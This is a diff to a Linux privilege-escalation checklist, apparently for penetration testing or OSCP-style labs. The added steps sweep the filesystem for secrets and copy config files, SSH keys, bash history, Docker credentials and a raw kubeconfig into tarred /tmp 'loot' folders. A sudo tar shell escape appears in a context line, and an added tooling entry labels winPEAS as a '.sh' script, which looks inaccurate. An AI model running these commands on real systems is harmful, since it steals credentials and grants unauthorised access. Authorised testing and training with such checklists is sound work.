@@ -40,20 +40,31 @@ Structured checklist for Linux privilege escalation covering rapid triage, enume
 ---
 
 ## 2. Credential & Secret Hunting
-- Search configuration directories for plaintext credentials: `grep -R "password" /etc /opt /var/www 2>/dev/null`
-- Scan user home directories for SSH keys and history: `ls -l ~/.ssh`, `grep -R "pass" ~ 2>/dev/null`
-- Check root and user crontabs for embedded credentials: `cat /etc/crontab`, `ls -l /etc/cron.*`
-- Inspect database/app configs: `find / -name "*.conf" -o -name "*.env" -o -name "*.ini" 2>/dev/null | head`
-- Review Docker/Kubernetes configs for secrets: `cat ~/.docker/config.json`, `kubectl config view`
-- Dump stored passwords from keyrings when unlocked: `secret-tool search user <user>`
+- Global sweep for sensitive strings (runs from `/`):  
+  `grep -R "password\|pass\|secret\|token" / 2>/dev/null`
+- Collect likely credential/config files for review:
+  ```bash
+  mkdir -p /tmp/loot-configs
+  find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.json" -o -name "config.php" -o -name "wp-config.php" \) \
+    -exec cp --parents {} /tmp/loot-configs \; 2>/dev/null
+  tar -czf /tmp/loot-configs.tgz -C /tmp loot-configs
+  ```
+- Copy SSH keys and known credential stores:
+  ```bash
+  mkdir -p /tmp/loot-keys
+  find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" \) -exec cp --parents {} /tmp/loot-keys \; 2>/dev/null
+  cp ~/.bash_history /tmp/loot-keys/bash_history 2>/dev/null
+  ```
+- Dump Docker/Kubernetes credentials when present:  
+  `cp ~/.docker/config.json /tmp/loot-configs/docker-config.json 2>/dev/null`, `kubectl config view --raw > /tmp/loot-configs/kubeconfig.yaml 2>/dev/null`
+- Quick find of OSCP-style flags: `find / -name "local.txt" -o -name "proof.txt" 2>/dev/null`
 
-**Command bundle for secret sweep:**
+**Simple secret sweep command bundle:**
 ```bash
-grep -R "password\|pass\|secret\|token" /etc /opt /var/www 2>/dev/null
-find / -name "*config*" -o -name "*.env" -o -name "*.ini" 2>/dev/null | head
-ls -la ~/.ssh
-cat ~/.ssh/config 2>/dev/null
-grep -R "BEGIN PRIVATE KEY" -n /home /root 2>/dev/null
+grep -R "password\|pass\|secret\|token" / 2>/dev/null | head
+find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.json" \) -maxdepth 5 2>/dev/null | head
+find / -type f -name "id_rsa" 2>/dev/null | head
+find / -name "local.txt" -o -name "proof.txt" 2>/dev/null
 ```
 
 ---
@@ -160,6 +171,7 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ## Tooling Reference
 - linPEAS: https://github.com/carlospolop/PEASS-ng
+- winPEAS.sh (drop onto Windows targets from Linux host): https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 - Linux Smart Enumeration (lse): https://github.com/diego-treitos/linux-smart-enumeration
 - Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
 - pspy: https://github.com/DominicBreuker/pspy
